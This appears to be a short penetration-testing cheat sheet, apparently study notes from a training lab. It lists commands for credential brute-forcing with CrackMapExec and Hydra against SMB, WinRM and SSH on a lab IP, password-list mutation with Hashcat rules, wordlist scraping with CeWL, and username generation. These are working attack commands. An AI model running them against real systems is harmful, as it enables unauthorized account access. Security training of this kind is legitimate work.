# Common brute-force

### CrackMapExec

```bash
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

for winrm or smb etc

```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

### Hydra

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```

change smb to ssh, rdp etc

### Hashcat

[Hashcat rules](https://hashcat.net/wiki/doku.php?id=rule\_based\_attack)

```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

### CeWL

```shell-session
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

### Automate list generator

```
./username-anarchy -i /home/ltnbob/names.txt 
```
